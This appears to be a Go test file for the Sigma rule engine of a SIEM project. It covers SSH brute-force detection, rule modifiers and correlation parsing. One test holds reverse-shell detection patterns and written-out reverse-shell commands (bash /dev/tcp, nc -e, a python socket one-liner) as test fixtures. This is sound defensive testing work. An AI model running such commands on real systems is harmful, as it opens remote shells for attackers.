package sigma

import (
	"testing"

	"github.com/vigil-siem/vigil/internal/common"
)

func ev(cat string, raw string, f map[string]string) *common.Event {
	if f == nil {
		f = map[string]string{}
	}
	return &common.Event{Category: cat, Raw: raw, Fields: f}
}

func mustRule(t *testing.T, src string) *Rule {
	t.Helper()
	r, err := ParseRule(src)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	return r
}

func TestSSHFailedLogin(t *testing.T) {
	r := mustRule(t, `
title: SSH failed password
id: ssh-failed
name: ssh_failed_login
level: low
tags:
  - attack.credential-access
  - attack.t1110
logsource:
  product: linux
  service: sshd
detection:
  selection:
    message|contains: 'Failed password'
  filter:
    source.ip|cidr: 10.0.0.0/8
  condition: selection and not filter
`)
	if !r.Matches(ev("log", "", map[string]string{"message": "Failed password for root from 1.2.3.4", "source.ip": "1.2.3.4", "log.service": "sshd"})) {
		t.Fatal("expected match")
	}
	if r.Matches(ev("log", "", map[string]string{"message": "Failed password for root from 10.1.2.3", "source.ip": "10.1.2.3", "log.service": "sshd"})) {
		t.Fatal("filter should exclude internal IP")
	}
	if r.Matches(ev("log", "", map[string]string{"message": "Failed password", "log.service": "cron"})) {
		t.Fatal("service mismatch should not match")
	}
	if got := r.MITRE(); len(got) != 1 || got[0] != "T1110" {
		t.Fatalf("mitre = %v", got)
	}
}

func TestModifiersAndOf(t *testing.T) {
	r := mustRule(t, `
title: Reverse shell
logsource:
  category: process_creation
  product: linux
detection:
  sel_bash:
    CommandLine|contains|all:
      - 'bash -i'
      - '/dev/tcp/'
  sel_nc:
    Image|endswith:
      - '/nc'
      - '/ncat'
    CommandLine|contains: ' -e '
  sel_re:
    CommandLine|re: 'python[23]? -c .*socket'
  condition: 1 of sel_*
`)
	cases := []struct {
		cmd, img string
		want     bool
	}{
		{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "/bin/bash", true},
		{"bash -i", "/bin/bash", false},
		{"nc -e /bin/sh 1.2.3.4 4444", "/usr/bin/nc", true},
		{"nc -l 4444", "/usr/bin/nc", false},
		{"python3 -c 'import socket,os'", "/usr/bin/python3", true},
		{"ls -la", "/bin/ls", false},
	}
	for _, c := range cases {
		e := ev("process", "", map[string]string{"process.command_line": c.cmd, "process.executable": c.img})
		if got := r.Matches(e); got != c.want {
			t.Errorf("%q: got %v want %v", c.cmd, got, c.want)
		}
	}
	if r.Matches(ev("log", "", map[string]string{"process.command_line": "bash -i /dev/tcp/"})) {
		t.Error("category mismatch must not match")
	}
}

func TestKeywordsWildcardsAllOfThem(t *testing.T) {
	r := mustRule(t, `
title: Keywords
detection:
  keywords:
    - 'segfault at*error'
    - 'Out of memory'
  condition: keywords
`)
	if !r.Matches(ev("log", "kernel: app[12]: segfault at 0 ip error 4", nil)) {
		t.Error("wildcard keyword should match")
	}
	if !r.Matches(ev("log", "kernel: OUT OF MEMORY: kill process", nil)) {
		t.Error("keywords are case-insensitive")
	}
	r2 := mustRule(t, `
title: All of them
detection:
  a:
    user.name: root
  b:
    event.action: [login, logon]
  condition: all of them
`)
	if !r2.Matches(ev("log", "", map[string]string{"user.name": "ROOT", "event.action": "logon"})) {
		t.Error("all of them should match")
	}
	if r2.Matches(ev("log", "", map[string]string{"user.name": "root"})) {
		t.Error("all of them requires b")
	}
}

func TestNullExistsNumeric(t *testing.T) {
	r := mustRule(t, `
title: Numeric
detection:
  sel:
    destination.port|gte: 4444
    user.name: null
    process.pid|exists: true
  condition: sel
`)
	if !r.Matches(ev("network", "", map[string]string{"destination.port": "5555", "process.pid": "1"})) {
		t.Error("expected numeric match")
	}
	if r.Matches(ev("network", "", map[string]string{"destination.port": "80", "process.pid": "1"})) {
		t.Error("port 80 < 4444")
	}
	if r.Matches(ev("network", "", map[string]string{"destination.port": "5555", "process.pid": "1", "user.name": "bob"})) {
		t.Error("null requires missing field")
	}
}

func TestCorrelationParse(t *testing.T) {
	r := mustRule(t, `
title: SSH brute force
id: ssh-bruteforce
level: high
correlation:
  type: event_count
  rules:
    - ssh_failed_login
  group-by:
    - source.ip
  timespan: 2m
  condition:
    gte: 5
response:
  action: block_ip
  timeout: 10m
  args:
    ip: source.ip
`)
	if !r.IsCorrelation() || r.Correlation.Threshold != 5 || r.Correlation.Timespan.Minutes() != 2 {
		t.Fatalf("bad correlation %+v", r.Correlation)
	}
	if !r.Correlation.Satisfied(5) || r.Correlation.Satisfied(4) {
		t.Fatal("threshold eval")
	}
	if r.Response == nil || r.Response.ArgFrom["ip"] != "source.ip" {
		t.Fatalf("response %+v", r.Response)
	}
}

func TestBadConditions(t *testing.T) {
	for _, c := range []string{"selection and", "missing", "(selection", "selection | count() > 5"} {
		_, err := ParseRule("title: x\ndetection:\n  selection:\n    a: b\n  condition: " + c + "\n")
		if err == nil {
			t.Errorf("%q should fail", c)
		}
	}
}

func TestLoadBundledRules(t *testing.T) {
	rules, errs := LoadDir("../../rules")
	for _, e := range errs {
		t.Error(e)
	}
	if len(rules) < 10 {
		t.Fatalf("expected bundled rules, got %d", len(rules))
	}
}
